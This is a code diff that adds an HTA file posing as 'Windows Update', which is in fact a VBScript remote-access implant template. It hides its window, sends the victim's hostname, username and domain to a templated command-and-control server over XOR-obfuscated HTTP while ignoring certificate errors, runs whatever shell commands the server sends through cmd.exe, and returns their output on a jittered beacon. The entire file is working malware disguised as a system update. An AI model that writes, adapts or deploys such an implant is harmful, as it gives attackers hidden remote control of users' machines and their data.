@@ -1,0 +1,320 @@
+<html>
+<head>
+    <title>Windows Update</title>
+    <HTA:APPLICATION
+        ID="oHTA"
+        APPLICATIONNAME="Windows Update"
+        BORDER="none"
+        CAPTION="no"
+        SHOWINTASKBAR="no"
+        SINGLEINSTANCE="yes"
+        SYSMENU="no"
+        WINDOWSTATE="minimize"/>
+    <script language="VBScript">
+        Dim C2_HOST, C2_PORT, C2_SCHEME, BEACON_INTERVAL, BEACON_JITTER, ENCRYPTION_KEY
+        Dim BASE_URL, AgentID
+
+        C2_HOST = "{{C2_HOST}}"
+        C2_PORT = {{C2_PORT}}
+        C2_SCHEME = "{{C2_SCHEME}}"
+        BEACON_INTERVAL = {{BEACON_INTERVAL}}
+        BEACON_JITTER = {{BEACON_JITTER}}
+        ENCRYPTION_KEY = "{{ENCRYPTION_KEY}}"
+        BASE_URL = C2_SCHEME & "://" & C2_HOST & ":" & CStr(C2_PORT)
+        AgentID = ""
+
+        Sub Window_OnLoad
+            window.resizeTo 0,0
+            window.moveTo -2000,-2000
+            ConnectToC2
+        End Sub
+
+        Function XOREncrypt(data)
+            Dim key, encrypted, i
+            key = ENCRYPTION_KEY
+            encrypted = ""
+            For i = 1 To Len(data)
+                encrypted = encrypted & Chr(Asc(Mid(data, i, 1)) Xor Asc(Mid(key, ((i-1) Mod Len(key)) + 1, 1)))
+            Next
+            XOREncrypt = Base64Encode(encrypted)
+        End Function
+
+        Function XORDecrypt(data)
+            Dim decoded, key, decrypted, i
+            decoded = Base64Decode(data)
+            key = ENCRYPTION_KEY
+            decrypted = ""
+            For i = 1 To Len(decoded)
+                decrypted = decrypted & Chr(Asc(Mid(decoded, i, 1)) Xor Asc(Mid(key, ((i-1) Mod Len(key)) + 1, 1)))
+            Next
+            XORDecrypt = decrypted
+        End Function
+
+        Function Base64Encode(sText)
+            Dim oXML, oNode
+            Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
+            Set oNode = oXML.CreateElement("base64")
+            oNode.dataType = "bin.base64"
+            oNode.nodeTypedValue = Stream_StringToBinary(sText)
+            Base64Encode = Replace(oNode.text, vbLf, "")
+            Set oNode = Nothing
+            Set oXML = Nothing
+        End Function
+
+        Function Base64Decode(sBase64)
+            Dim oXML, oNode
+            Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
+            Set oNode = oXML.CreateElement("base64")
+            oNode.dataType = "bin.base64"
+            oNode.text = sBase64
+            Base64Decode = Stream_BinaryToString(oNode.nodeTypedValue)
+            Set oNode = Nothing
+            Set oXML = Nothing
+        End Function
+
+        Function Stream_StringToBinary(Text)
+            Const adTypeText = 2
+            Const adTypeBinary = 1
+            Dim BinaryStream
+            Set BinaryStream = CreateObject("ADODB.Stream")
+            BinaryStream.Type = adTypeText
+            BinaryStream.CharSet = "us-ascii"
+            BinaryStream.Open
+            BinaryStream.WriteText Text
+            BinaryStream.Position = 0
+            BinaryStream.Type = adTypeBinary
+            Stream_StringToBinary = BinaryStream.Read
+            BinaryStream.Close
+            Set BinaryStream = Nothing
+        End Function
+
+        Function Stream_BinaryToString(Binary)
+            Const adTypeText = 2
+            Const adTypeBinary = 1
+            Dim BinaryStream
+            Set BinaryStream = CreateObject("ADODB.Stream")
+            BinaryStream.Type = adTypeBinary
+            BinaryStream.Open
+            BinaryStream.Write Binary
+            BinaryStream.Position = 0
+            BinaryStream.Type = adTypeText
+            BinaryStream.CharSet = "us-ascii"
+            Stream_BinaryToString = BinaryStream.ReadText
+            BinaryStream.Close
+            Set BinaryStream = Nothing
+        End Function
+
+        Function GetMetadata()
+            Dim wshNetwork
+            Set wshNetwork = CreateObject("WScript.Network")
+            GetMetadata = "{" & _
+                """type"":""register""," & _
+                """metadata"":{" & _
+                """hostname"":""" & wshNetwork.ComputerName & """," & _
+                """username"":""" & wshNetwork.UserName & """," & _
+                """os"":""Windows""," & _
+                """domain"":""" & wshNetwork.UserDomain & """," & _
+                """mode"":""beacon""," & _
+                """beacon_interval"":" & CStr(BEACON_INTERVAL) & "," & _
+                """beacon_jitter"":" & CStr(BEACON_JITTER) & _
+                "}" & _
+                "}"
+            Set wshNetwork = Nothing
+        End Function
+
+        Function GetCheckinMsg(results)
+            Dim wshNetwork
+            Set wshNetwork = CreateObject("WScript.Network")
+            Dim resultsJson
+            If results = "" Then
+                resultsJson = "[]"
+            Else
+                resultsJson = results
+            End If
+            GetCheckinMsg = "{" & _
+                """type"":""checkin""," & _
+                """agent_id"":""" & AgentID & """," & _
+                """metadata"":{" & _
+                """hostname"":""" & wshNetwork.ComputerName & """," & _
+                """username"":""" & wshNetwork.UserName & """," & _
+                """os"":""Windows""," & _
+                """mode"":""beacon""," & _
+                """beacon_interval"":" & CStr(BEACON_INTERVAL) & "," & _
+                """beacon_jitter"":" & CStr(BEACON_JITTER) & _
+                "}," & _
+                """results"":" & resultsJson & _
+                "}"
+            Set wshNetwork = Nothing
+        End Function
+
+        Function ExecuteCommand(cmd)
+            On Error Resume Next
+            Dim wshShell, oExec, output
+            Set wshShell = CreateObject("WScript.Shell")
+            Set oExec = wshShell.Exec("cmd.exe /c " & cmd)
+
+            Dim waitCount
+            waitCount = 0
+            Do While oExec.Status = 0 And waitCount < 300
+                WScript.Sleep 100
+                waitCount = waitCount + 1
+            Loop
+
+            output = oExec.StdOut.ReadAll()
+            If output = "" Then
+                output = oExec.StdErr.ReadAll()
+            End If
+            If output = "" Then
+                output = "Command executed successfully (no output)"
+            End If
+
+            ExecuteCommand = output
+            Set oExec = Nothing
+            Set wshShell = Nothing
+        End Function
+
+        Function SendHTTPRequest(url, body)
+            On Error Resume Next
+            Dim http
+            Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+            http.setOption 2, 13056  ' Ignore SSL errors
+            http.Open "POST", url, False
+            http.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+            http.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
+            http.send body
+
+            If http.Status = 200 Then
+                SendHTTPRequest = http.responseText
+            Else
+                SendHTTPRequest = ""
+            End If
+            Set http = Nothing
+        End Function
+
+        Function GetSleepTime(baseInterval, jitterPercent)
+            If jitterPercent <= 0 Or jitterPercent > 100 Then
+                GetSleepTime = baseInterval
+                Exit Function
+            End If
+            Dim jitterAmount, minSleep, maxSleep
+            jitterAmount = baseInterval * (jitterPercent / 100.0)
+            minSleep = baseInterval - jitterAmount
+            If minSleep < 0 Then minSleep = 0
+            maxSleep = baseInterval + jitterAmount
+            Randomize
+            GetSleepTime = Int(minSleep + (maxSleep - minSleep) * Rnd())
+        End Function
+
+        Function SimpleJsonParse(jsonStr, key)
+            ' Very basic JSON value extraction
+            Dim searchKey, startPos, endPos, value
+            searchKey = """" & key & """:"
+            startPos = InStr(jsonStr, searchKey)
+            If startPos = 0 Then
+                SimpleJsonParse = ""
+                Exit Function
+            End If
+            startPos = startPos + Len(searchKey)
+            If Mid(jsonStr, startPos, 1) = """" Then
+                startPos = startPos + 1
+                endPos = InStr(startPos, jsonStr, """")
+                value = Mid(jsonStr, startPos, endPos - startPos)
+            Else
+                endPos = InStr(startPos, jsonStr, ",")
+                If endPos = 0 Then endPos = InStr(startPos, jsonStr, "}")
+                value = Mid(jsonStr, startPos, endPos - startPos)
+            End If
+            SimpleJsonParse = value
+        End Function
+
+        Sub ConnectToC2()
+            Dim pendingResultsJson
+            pendingResultsJson = "[]"
+
+            Do While True
+                On Error Resume Next
+
+                ' Register if needed
+                If AgentID = "" Then
+                    Dim registerMsg, encrypted, response
+                    registerMsg = GetMetadata()
+                    encrypted = XOREncrypt(registerMsg)
+                    response = SendHTTPRequest(BASE_URL & "/submit-form", encrypted)
+
+                    If response <> "" Then
+                        Dim decrypted
+                        decrypted = XORDecrypt(response)
+                        Dim regType
+                        regType = SimpleJsonParse(decrypted, "type")
+                        If regType = "registered" Or regType = "checkin_ack" Then
+                            AgentID = SimpleJsonParse(decrypted, "agent_id")
+                        End If
+                    End If
+
+                    If AgentID = "" Then
+                        WScript.Sleep 5000
+                    End If
+                End If
+
+                If AgentID <> "" Then
+                    ' Checkin
+                    Dim checkinMsg, checkinEnc, checkinResp
+                    checkinMsg = GetCheckinMsg(pendingResultsJson)
+                    checkinEnc = XOREncrypt(checkinMsg)
+                    checkinResp = SendHTTPRequest(BASE_URL & "/api/v1/update", checkinEnc)
+                    pendingResultsJson = "[]"
+
+                    If checkinResp <> "" Then
+                        Dim checkinDec, respType
+                        checkinDec = XORDecrypt(checkinResp)
+                        respType = SimpleJsonParse(checkinDec, "type")
+
+                        If respType = "registered" Then
+                            AgentID = SimpleJsonParse(checkinDec, "agent_id")
+                        ElseIf respType = "commands" Then
+                            ' Extract commands and execute
+                            ' Simple parsing for command array
+                            Dim cmdStart, cmdEnd, cmdStr, cmdOutput
+                            cmdStart = InStr(checkinDec, """command"":""")
+                            Do While cmdStart > 0
+                                cmdStart = cmdStart + Len("""command"":""")
+                                cmdEnd = InStr(cmdStart, checkinDec, """")
+                                cmdStr = Mid(checkinDec, cmdStart, cmdEnd - cmdStart)
+
+                                If Left(cmdStr, 16) = "__set_interval:" Then
+                                    BEACON_INTERVAL = CInt(Mid(cmdStr, 17))
+                                ElseIf cmdStr = "__kill" Then
+                                    window.close
+                                    Exit Sub
+                                ElseIf cmdStr <> "" Then
+                                    cmdOutput = ExecuteCommand(cmdStr)
+                                    ' Build result JSON
+                                    Dim resultEntry
+                                    resultEntry = "{""type"":""response"",""output"":""" & _
+                                        Replace(Replace(cmdOutput, """", "\"""), vbCrLf, "\n") & _
+                                        """,""command"":""" & cmdStr & """}"
+                                    If pendingResultsJson = "[]" Then
+                                        pendingResultsJson = "[" & resultEntry & "]"
+                                    Else
+                                        pendingResultsJson = Left(pendingResultsJson, Len(pendingResultsJson) - 1) & "," & resultEntry & "]"
+                                    End If
+                                End If
+
+                                ' Find next command
+                                cmdStart = InStr(cmdEnd + 1, checkinDec, """command"":""")
+                            Loop
+                        End If
+                    End If
+
+                    ' Sleep with jitter
+                    Dim sleepTime
+                    sleepTime = GetSleepTime(BEACON_INTERVAL, BEACON_JITTER)
+                    WScript.Sleep sleepTime * 1000
+                End If
+            Loop
+        End Sub
+    </script>
+</head>
+<body>
+</body>
+</html>
